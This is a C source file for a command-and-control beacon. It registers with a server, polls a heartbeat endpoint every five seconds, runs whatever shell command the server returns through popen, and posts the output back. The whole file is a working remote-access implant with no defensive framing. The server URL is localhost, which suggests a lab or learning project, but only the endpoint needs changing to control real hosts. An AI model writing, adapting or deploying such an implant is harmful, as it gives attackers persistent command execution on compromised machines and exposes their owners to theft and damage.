#include <arpa/inet.h>
#include <curl/curl.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

#define MAX_HTTP_RESPONSE_BUFFER_SIZE    128
#define SERVER_REGISTER_ENDPOINT         "http://localhost:8000/register"
#define SERVER_HEARTBEAT_ENDPOINT_BASE   "http://localhost:8000/heartbeat/"
#define SERVER_UPDATE_TASK_ENDPOINT_BASE "http://localhost:8000/update_task/"

bool global_shutdown_requested = false;

typedef struct
{
    char * task_unique_identifier;
    char * shell_command_text;
    char * execution_output_text;
} beacon_task_structure;

static void handle_termination_signal (int received_signal_number)
{
    if (received_signal_number == SIGINT || received_signal_number == SIGTERM)
    {
        global_shutdown_requested = true;
    }
}

void configure_process_signal_handlers (void)
{
    struct sigaction signal_action_configuration = { 0 };
    signal_action_configuration.sa_handler       = handle_termination_signal;
    sigemptyset(&signal_action_configuration.sa_mask);
    signal_action_configuration.sa_flags = 0;

    sigaction(SIGINT, &signal_action_configuration, NULL);
    sigaction(SIGTERM, &signal_action_configuration, NULL);
}

size_t handle_http_response_data (void * incoming_data_pointer,
                                  size_t data_element_size,
                                  size_t number_of_elements,
                                  void * destination_buffer_pointer)
{
    size_t total_incoming_data_size = data_element_size * number_of_elements;
    char * response_buffer          = (char *)destination_buffer_pointer;
    size_t current_buffer_length    = strlen(response_buffer);

    if (current_buffer_length + total_incoming_data_size
        < MAX_HTTP_RESPONSE_BUFFER_SIZE - 1)
    {
        strncat(response_buffer,
                (char *)incoming_data_pointer,
                total_incoming_data_size);
    }
    return total_incoming_data_size;
}

char * send_registration_request_to_server (CURL * curl_handle)
{
    char * connection_id_response_buffer = NULL;

    if (NULL == curl_handle)
    {
        (void)fprintf(stderr, "cURL cannot be NULL\n");
        goto CLEANUP_AND_EXIT;
    }

    connection_id_response_buffer
        = calloc(MAX_HTTP_RESPONSE_BUFFER_SIZE, sizeof(char));

    if (NULL == connection_id_response_buffer)
    {
        goto CLEANUP_AND_EXIT;
    }

    curl_easy_setopt(curl_handle, CURLOPT_URL, SERVER_REGISTER_ENDPOINT);
    curl_easy_setopt(
        curl_handle, CURLOPT_WRITEFUNCTION, handle_http_response_data);
    curl_easy_setopt(
        curl_handle, CURLOPT_WRITEDATA, connection_id_response_buffer);

    CURLcode http_request_result = curl_easy_perform(curl_handle);

    if (http_request_result != CURLE_OK)
    {
        (void)fprintf(stderr,
                      "curl_easy_perform() failed: %s\n",
                      curl_easy_strerror(http_request_result));
    }

    curl_easy_reset(curl_handle);

CLEANUP_AND_EXIT:
    return connection_id_response_buffer;
}

void escape_string_for_json_format (const char * original_string,
                                    char *       escaped_output_buffer,
                                    size_t       maximum_buffer_size)
{
    size_t output_buffer_index = 0;
    for (size_t input_character_index = 0;
         original_string[input_character_index] != '\0'
         && output_buffer_index + 2 < maximum_buffer_size;
         input_character_index++)
    {
        char current_character = original_string[input_character_index];
        switch (current_character)
        {
            case '\\':
                escaped_output_buffer[output_buffer_index++] = '\\';
                escaped_output_buffer[output_buffer_index++] = '\\';
                break;
            case '\"':
                escaped_output_buffer[output_buffer_index++] = '\\';
                escaped_output_buffer[output_buffer_index++] = '\"';
                break;
            case '\n':
                escaped_output_buffer[output_buffer_index++] = '\\';
                escaped_output_buffer[output_buffer_index++] = 'n';
                break;
            case '\r':
                escaped_output_buffer[output_buffer_index++] = '\\';
                escaped_output_buffer[output_buffer_index++] = 'r';
                break;
            case '\t':
                escaped_output_buffer[output_buffer_index++] = '\\';
                escaped_output_buffer[output_buffer_index++] = 't';
                break;
            default:
                escaped_output_buffer[output_buffer_index++]
                    = current_character;
                break;
        }
    }
    escaped_output_buffer[output_buffer_index] = '\0';
}

void send_task_completion_update_to_server (
    CURL *                curl_handle,
    const char *          connection_identifier,
    beacon_task_structure completed_task)
{
    if (NULL == connection_identifier)
    {
        (void)fprintf(stderr, "UUID cannot be NULL\n");
        goto CLEANUP_AND_EXIT;
    }

    if (NULL == curl_handle)
    {
        (void)fprintf(stderr, "cURL cannot be NULL\n");
        goto CLEANUP_AND_EXIT;
    }

    char complete_task_endpoint_url[256] = { 0 };
    snprintf(complete_task_endpoint_url,
             sizeof(complete_task_endpoint_url),
             "%s%s",
             SERVER_UPDATE_TASK_ENDPOINT_BASE,
             connection_identifier);

    char json_payload_data[4096] = { 0 };

    char json_escaped_task_output[2048] = { 0 };

    escape_string_for_json_format(completed_task.execution_output_text,
                                  json_escaped_task_output,
                                  sizeof(json_escaped_task_output));

    if (NULL == completed_task.execution_output_text)
    {
        snprintf(json_payload_data,
                 sizeof(json_payload_data),
                 "{\"uid\": \"%s\", \"command\": \"%s\", \"output\": \"%s\", "
                 "\"status\": %d}",
                 completed_task.task_unique_identifier,
                 completed_task.shell_command_text,
                 "",
                 -1);
    }
    else
    {
        snprintf(json_payload_data,
                 sizeof(json_payload_data),
                 "{\"uid\": \"%s\", \"command\": \"%s\", \"output\": \"%s\", "
                 "\"status\": %d}",
                 completed_task.task_unique_identifier,
                 completed_task.shell_command_text,
                 json_escaped_task_output,
                 0);
    }

    struct curl_slist * http_request_headers = NULL;
    http_request_headers = curl_slist_append(http_request_headers,
                                             "Content-Type: application/json");

    curl_easy_setopt(curl_handle, CURLOPT_URL, complete_task_endpoint_url);
    curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, NULL);
    curl_easy_setopt(curl_handle, CURLOPT_HTTPHEADER, http_request_headers);
    curl_easy_setopt(curl_handle, CURLOPT_POSTFIELDS, json_payload_data);

    CURLcode http_request_result = curl_easy_perform(curl_handle);
    if (http_request_result != CURLE_OK)
    {
        fprintf(stderr,
                "curl_easy_perform() failed: %s\n",
                curl_easy_strerror(http_request_result));
    }

    curl_easy_reset(curl_handle);

CLEANUP_AND_EXIT:
    return;
}

beacon_task_structure execute_shell_command_and_capture_output (
    beacon_task_structure task_to_execute)
{
    char * command_execution_output = NULL;
    FILE * shell_process_handle
        = popen(task_to_execute.shell_command_text, "r");
    if (!shell_process_handle)
    {
        perror("popen failed");
        goto CLEANUP_AND_EXIT;
    }

    char   temporary_read_buffer[1024]      = { 0 };
    size_t allocated_output_buffer_capacity = 4096;
    size_t current_output_length            = 0;
    command_execution_output
        = calloc(allocated_output_buffer_capacity, sizeof(char));
    if (!command_execution_output)
    {
        perror("calloc failed");
        pclose(shell_process_handle);
        goto CLEANUP_AND_EXIT;
    }

    while (fgets(temporary_read_buffer,
                 sizeof(temporary_read_buffer),
                 shell_process_handle))
    {
        size_t current_chunk_length = strlen(temporary_read_buffer);
        if (current_output_length + current_chunk_length + 1
            > allocated_output_buffer_capacity)
        {
            allocated_output_buffer_capacity *= 2;
            char * reallocated_output_buffer = realloc(
                command_execution_output, allocated_output_buffer_capacity);
            if (!reallocated_output_buffer)
            {
                perror("realloc failed");
                free(command_execution_output);
                pclose(shell_process_handle);
                goto CLEANUP_AND_EXIT;
            }
            command_execution_output = reallocated_output_buffer;
        }
        strcat(command_execution_output, temporary_read_buffer);
        current_output_length += current_chunk_length;
    }

    pclose(shell_process_handle);

CLEANUP_AND_EXIT:
    task_to_execute.execution_output_text = command_execution_output;
    return task_to_execute;
}

beacon_task_structure parse_task_from_server_response (
    char * server_response_buffer)
{
    beacon_task_structure parsed_task_result = { 0 };

    const char * task_id_start_position
        = strstr(server_response_buffer, "uid=UUID('");
    const char * command_text_start_position
        = strstr(server_response_buffer, "command='");

    if (task_id_start_position && command_text_start_position)
    {
        task_id_start_position += strlen("uid=UUID('");
        const char * task_id_end_position
            = strchr(task_id_start_position, '\'');
        if (task_id_end_position
            && task_id_end_position > task_id_start_position)
        {
            size_t task_id_length
                = task_id_end_position - task_id_start_position;
            parsed_task_result.task_unique_identifier
                = (char *)calloc(task_id_length + 1, sizeof(char));
            if (parsed_task_result.task_unique_identifier)
            {
                strncpy(parsed_task_result.task_unique_identifier,
                        task_id_start_position,
                        task_id_length);
            }
        }

        command_text_start_position += strlen("command='");
        const char * command_text_end_position
            = strchr(command_text_start_position, '\'');
        if (command_text_end_position
            && command_text_end_position > command_text_start_position)
        {
            size_t command_text_length
                = command_text_end_position - command_text_start_position;
            parsed_task_result.shell_command_text
                = (char *)calloc(command_text_length + 1, sizeof(char));
            if (parsed_task_result.shell_command_text)
            {
                strncpy(parsed_task_result.shell_command_text,
                        command_text_start_position,
                        command_text_length);
            }
        }
    }
    else
    {
        fprintf(stderr, "Could not find UID or command in string.\n");
    }

    return parsed_task_result;
}

void send_heartbeat_and_check_for_tasks (CURL *       curl_handle,
                                         const char * connection_identifier)
{
    if (NULL == connection_identifier)
    {
        (void)fprintf(stderr, "UUID cannot be NULL\n");
        goto CLEANUP_AND_EXIT;
    }

    if (NULL == curl_handle)
    {
        (void)fprintf(stderr, "cURL cannot be NULL\n");
        goto CLEANUP_AND_EXIT;
    }

    char heartbeat_endpoint_url[256] = { 0 };
    (void)snprintf(heartbeat_endpoint_url,
                   sizeof(heartbeat_endpoint_url),
                   "%s%s",
                   SERVER_HEARTBEAT_ENDPOINT_BASE,
                   connection_identifier);

    char server_response_buffer[MAX_HTTP_RESPONSE_BUFFER_SIZE] = { 0 };

    curl_easy_setopt(curl_handle, CURLOPT_URL, heartbeat_endpoint_url);
    curl_easy_setopt(
        curl_handle, CURLOPT_WRITEFUNCTION, handle_http_response_data);
    curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, server_response_buffer);

    struct curl_slist * http_request_headers = NULL;
    http_request_headers = curl_slist_append(http_request_headers,
                                             "Content-Type: application/json");
    curl_easy_setopt(curl_handle, CURLOPT_HTTPHEADER, http_request_headers);

    CURLcode http_request_result = curl_easy_perform(curl_handle);

    if (http_request_result != CURLE_OK)
    {
        (void)fprintf(stderr,
                      "curl_easy_perform() failed: %s\n",
                      curl_easy_strerror(http_request_result));
    }

    if (strlen(server_response_buffer) == 0)
    {
        printf("No command received.\n");
    }
    else
    {
        beacon_task_structure received_task
            = parse_task_from_server_response(server_response_buffer);
        received_task = execute_shell_command_and_capture_output(received_task);

        if (NULL == received_task.execution_output_text)
        {
            fprintf(stderr, "Task execution failed\n");
            received_task.execution_output_text = strdup("");
        }

        curl_easy_reset(curl_handle);

        send_task_completion_update_to_server(
            curl_handle, connection_identifier, received_task);

        if (received_task.task_unique_identifier)
        {
            free(received_task.task_unique_identifier);
        }
        if (received_task.execution_output_text)
        {
            free(received_task.execution_output_text);
        }
        if (received_task.shell_command_text)
        {
            free(received_task.shell_command_text);
        }
    }

    curl_slist_free_all(http_request_headers);
    curl_easy_reset(curl_handle);

CLEANUP_AND_EXIT:
    return;
}

int main (void)
{
    configure_process_signal_handlers();
    curl_global_init(CURL_GLOBAL_DEFAULT);

    CURL * curl_session_handle = curl_easy_init();
    if (!curl_session_handle)
    {
        (void)fprintf(stderr, "Failed to initialize CURL\n");
        curl_global_cleanup();
        return 1;
    }

    char * server_assigned_connection_id
        = send_registration_request_to_server(curl_session_handle);

    if (NULL == server_assigned_connection_id)
    {
        fprintf(stderr, "Failed to register with server\n");
        goto CLEANUP_AND_EXIT;
    }

    printf("Registered with connection ID: %s\n",
           server_assigned_connection_id);

    while (!global_shutdown_requested)
    {
        send_heartbeat_and_check_for_tasks(curl_session_handle,
                                           server_assigned_connection_id);
        sleep(5);
    }

    free(server_assigned_connection_id);

CLEANUP_AND_EXIT:
    curl_easy_cleanup(curl_session_handle);
    curl_global_cleanup();

    return 0;
}
